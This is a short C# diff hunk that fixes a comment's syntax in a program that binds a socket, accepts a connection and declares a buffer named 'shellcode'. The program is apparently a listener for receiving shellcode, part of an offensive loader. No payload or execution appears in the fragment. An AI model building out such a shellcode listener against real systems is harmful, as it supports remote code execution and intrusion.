@@ -53,7 +53,7 @@ class Program
         s.Bind(localEndpoint);
         s.Listen(5);
 
-	# Accept incomming connection
+	// Accept incomming connection
         Socket handler = s.Accept();
         byte[] bytes = new byte[1024];
         byte[] shellcode;
